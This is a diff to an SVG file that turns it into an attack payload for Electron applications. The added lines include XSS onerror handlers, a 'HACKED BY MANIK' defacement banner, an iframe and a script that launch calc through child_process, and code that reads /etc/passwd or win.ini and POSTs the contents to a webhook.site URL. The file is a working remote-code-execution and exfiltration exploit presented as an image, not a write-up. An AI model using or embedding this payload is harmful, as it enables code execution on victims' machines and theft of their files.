@@ -3,34 +3,40 @@
   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
 
-  <!-- Visual element -->
+  <!-- Visual trigger -->
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
 
-  <!-- XSS trigger -->
+  <!-- DOM-injection for fallback alert -->
   <foreignObject width="100" height="50">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <img src="x" onerror="alert(document.domain)" />
+      <h1>HACKED BY MANIK</h1>
+      <img src="x" onerror="alert('XSS')" />
     </body>
   </foreignObject>
-
-  <!-- Electron-only: Simulasi Baca File -->
+<iframe srcdoc="<script>require('child_process').exec('calc')</script>"></iframe>
+<img src="x" onerror="window.open('file:///C:/windows/win.ini')">
+  <!-- RCE & File Read for Electron -->
   <script>
     try {
+      const { exec } = require('child_process');
       const fs = require('fs');
-      fs.readFile('D:/xss.txt', 'utf8', (err, data) => {
-        if (!err) alert(data);
-      });
-    } catch (e) {
-      alert("Not running in Electron: " + e);
-    }
-  </script>
 
-  <!-- Electron-only: Simulasi Jalankan calc.exe -->
-  <script>
-    try {
-      require('child_process').exec('calc');
+      // Jalankan kalkulator (Windows)
+      exec('calc');
+
+      // Baca /etc/passwd (Linux/macOS) atau C:\Windows\win.ini (Windows)
+      const file = process.platform === 'win32' ? 'C:\\Windows\\win.ini' : '/etc/passwd';
+      fs.readFile(file, 'utf8', (err, data) => {
+        if (!err) {
+          fetch('https://webhook.site/844f96db-97c0-47d2-86a2-b494fb193474', {
+            method: 'POST',
+            body: data
+          });
+        }
+      });
+
     } catch (e) {
-      alert("Not running in Electron: " + e);
+      alert("Not running in Electron or nodeIntegration is off: " + e);
     }
   </script>
 
